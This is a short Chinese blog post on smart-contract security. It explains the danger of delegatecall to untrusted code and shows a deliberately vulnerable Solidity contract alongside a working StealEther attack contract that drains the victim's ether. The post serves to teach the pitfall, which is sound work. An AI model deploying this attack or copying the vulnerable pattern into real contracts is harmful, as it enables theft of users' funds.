---
title: 8-不安全Delegatecall

date: 2023-05-12	

categories: 合约安全	

tags: [区块链,合约安全]
---	

# 不安全的代理调用

委托调用（Delegatecall）不应该被用于不受信任的合约，因为它把所有的控制权都交给了委托接受者。在这个例子中，不受信任的合约偷走了合约中所有的以太币。

```solidity
contract UntrustedDelegateCall {
    constructor() payable {
        require(msg.value == 1 ether);
    }

    function doDelegateCall(address _delegate, bytes calldata data) public {
        (bool ok, ) = _delegate.delegatecall(data);
        require(ok, "delegatecall failed");
    }
}

contract StealEther {
    function steal() public {
        (bool ok, ) = tx.origin.call{value: address(this).balance}("");
        require(ok);
    }

    function attack(address victim) public {
        UntrustedDelegateCall(victim).doDelegateCall(
            address(this),
            abi.encodeWithSignature("steal()")
        );
    }
}
```